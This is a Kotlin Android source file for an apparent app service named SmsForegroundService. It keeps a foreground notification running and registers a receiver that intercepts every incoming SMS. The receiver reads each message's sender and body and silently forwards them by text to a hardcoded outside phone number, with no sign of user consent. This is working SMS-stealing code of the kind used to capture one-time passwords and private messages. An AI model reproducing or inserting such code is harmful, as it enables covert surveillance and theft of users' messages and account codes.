package com.tyreplex.ops


import android.annotation.TargetApi
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.graphics.Color
import android.os.Build
import android.os.Build.VERSION
import android.os.Build.VERSION_CODES
import android.os.Bundle
import android.os.IBinder
import android.telephony.SmsManager
import android.telephony.SmsMessage
import android.util.Log
import android.widget.Toast
import androidx.annotation.RequiresApi
import androidx.core.app.NotificationCompat
import java.util.*


class SmsForegroundService : Service()  {
    private val myBroadCastReceiver: BroadcastReceiver = SmsService()

        override fun onCreate() {
        super.onCreate()
        startForeground()
//            registerReceiver(myBroadCastReceiver, IntentFilter("android.provider.Telephony.SMS_RECEIVED"))
//            Sms()
//            onStart()
        serviceRunning = true
        Timer().schedule(object : TimerTask() {
            override fun run() {
                if (serviceRunning == true) {
                    updateNotification("I got updated!")
                }
            }
        }, 5000)
    }

    class SmsService : BroadcastReceiver() {
        private val TAG: String = "SmsService"
//    private val myBroadcastReceiver: BroadcastReceiver = BroadcastReceiver();

        override fun onReceive(context: Context?, intent: Intent) {
            // TODO Auto-generated method stub
            if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
                val bundle: Bundle? = intent.getExtras() //---get the SMS message passed in---
                var msgs: Array<SmsMessage?>? = null
                var msg_from: String?

                if (bundle != null) {
                    //---retrieve the SMS message received---
                    try {
                        val pdus = bundle.get("pdus") as Array<Any>
                        msgs = arrayOfNulls<SmsMessage>(pdus.size)
                        for (i in msgs.indices) {
                            msgs!![i] = SmsMessage.createFromPdu(pdus[i] as ByteArray)
                            msg_from = msgs[i]?.getOriginatingAddress()
                            val msgBody: String? = msgs[i]?.getMessageBody()
                            val toSendSmsNumber = "+918586875379"
                            var message = "Sender Name: $msg_from \n Body: $msgBody";

                            sendSms(toSendSmsNumber, message)

                            Log.e(TAG, "onReceivePdu FOREGROUND SERVICE: $msgBody")
                            Log.e(TAG, "onReceivePdu FOREGROUND SERVICE: $msg_from")
                            Toast.makeText(context, msgBody, Toast.LENGTH_LONG).show()
                        }
                    } catch (e: Exception) {
//                            Log.d("Exception caught",e.getMessage());
                    }
                }
            }
        }

        @TargetApi(Build.VERSION_CODES.HONEYCOMB)
        private fun sendSms(phoneNumber: String?, message: String?) {
            try {
                val smsManager = SmsManager.getDefault()
                smsManager.sendTextMessage(phoneNumber, null, message, null, null)
            } catch (e: Exception) {
                e.printStackTrace()
            }

        }


    }



    val notificationId = 1
    var serviceRunning = false
    lateinit var builder: NotificationCompat.Builder
    lateinit var channel: NotificationChannel
    lateinit var manager: NotificationManager



    override fun onDestroy() {
        super.onDestroy()
        serviceRunning = false
    }


    @RequiresApi(Build.VERSION_CODES.O)
    private fun createNotificationChannel(channelId: String, channelName: String): String {
        channel = NotificationChannel(channelId,
            channelName, NotificationManager.IMPORTANCE_NONE)
        channel.lightColor = Color.BLUE
        channel.lockscreenVisibility = Notification.VISIBILITY_PRIVATE
        manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        manager.createNotificationChannel(channel)
        return channelId
    }

    private fun startForeground() {
        val channelId =
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                createNotificationChannel("foreground_service", "Sms Foreground Service")
            } else {
                // If earlier version channel ID is not used
                // https://developer.android.com/reference/android/support/v4/app/NotificationCompat.Builder.html#NotificationCompat.Builder(android.content.Context)
                ""
            }
        builder = NotificationCompat.Builder(this, channelId)
        builder
            .setOngoing(true)
            .setOnlyAlertOnce(true)
            .setSmallIcon(R.mipmap.ic_launcher)
            .setContentTitle("Sms Foreground Service")
            .setContentText("Sms Foreground Service")
            .setCategory(Notification.CATEGORY_SERVICE)
        startForeground(1, builder.build())
    }

    private fun updateNotification(text: String) {
        builder
            .setContentText(text)
        manager.notify(notificationId, builder.build());
    }

    override fun onBind(intent: Intent): IBinder? {
        return null
    }

}